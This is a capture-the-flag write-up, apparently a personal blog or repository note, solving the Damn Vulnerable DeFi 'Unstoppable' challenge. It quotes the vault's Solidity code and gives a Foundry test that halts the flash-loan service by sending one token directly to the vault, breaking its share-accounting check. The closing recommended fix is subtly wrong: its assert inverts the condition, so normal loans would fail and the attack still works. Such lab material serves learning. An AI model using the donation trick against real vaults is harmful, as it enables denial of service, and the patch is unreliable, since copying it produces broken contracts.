# Damnvulnerabledefi - UnstoppableVault

<img width="1416" alt="스크린샷 2024-09-16 오후 10 43 23" src="https://github.com/user-attachments/assets/6cf309ee-1ba8-419d-b89e-5020d59d41f6">

According to the readme we should stop the flashloan service. 
First, let's look at unstoppablevault.sol. 
The code for an unstoppable vault is shown below.

``` solidity
    function maxFlashLoan(address _token) public view nonReadReentrant returns (uint256) {
        if (address(asset) != _token) {
            return 0;
        }

        return totalAssets();
    }
```

First, the function of maxFlashLoan. maxFlashLoan is function of type public, view, modifier "nonReadReentrant".
max FlashLoan function is returns data type of uint256.
the totalAssets function is returns the total amount of underlying assets held by the vault.


``` solidity
    function flashFee(address _token, uint256 _amount) public view returns (uint256 fee) {
        if (address(asset) != _token) {
            revert UnsupportedCurrency();
        }

        if (block.timestamp < end && _amount < maxFlashLoan(_token)) {
            return 0;
        } else {
            return _amount.mulWadUp(FEE_FACTOR);
        }
    }
```

next function is flashFee. the flashFee is function of type public, view. and input parameter is address, uint256. 
the asset is pointed ERC20 token. so, if argument _token does not matched with ERC20 address the transaction is revert.

``` solidity
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);
        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }

        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);

        return true;
    }
```

next, is flashLoan function. Looking at line 4, if covertToShares(totalSupply) and balanceBefore are not equal, it will revert. the balanceBefore variables is updated by return value of the function totalAssets. but, totalSupply is global variables is defind by ERC20 contract, updated deposit function flow for _mint.

``` solidity
function deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {
        // Check for rounding error since we round down in previewDeposit.
        require((shares = previewDeposit(assets)) != 0, "ZERO_SHARES");

        // Need to transfer before minting or ERC777s could reenter.
        asset.safeTransferFrom(msg.sender, address(this), assets);

        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);

        afterDeposit(assets, shares);
    }

    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;

        // Cannot overflow because the sum of all user
        // balances can't exceed the max uint256 value.
        unchecked {
            balanceOf[to] += amount;
        }

        emit Transfer(address(0), to, amount);
    }

```
we're using ERC20 transfer function and send token to vault, it could be updated balanceBefore. but totalSupply isn't. then, we can stop flashloan service.

``` solidity
    function test_unstoppable() public checkSolvedByPlayer {
        console.log("before totalAssets: ", vault.totalAssets());
        token.transfer(address(vault), 1);
        console.log("after totalAssets", vault.totalAssets());
    }
```

#result
![스크린샷 2024-09-20 오전 1 07 54](https://github.com/user-attachments/assets/e1feef37-fc2e-49d1-80d1-5b0159a5b1cf)

#Recommendations
``` solidity
        - if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement // shares : DVT
        + assert(convertToShares(totalSupply) != balanceBefore);
```

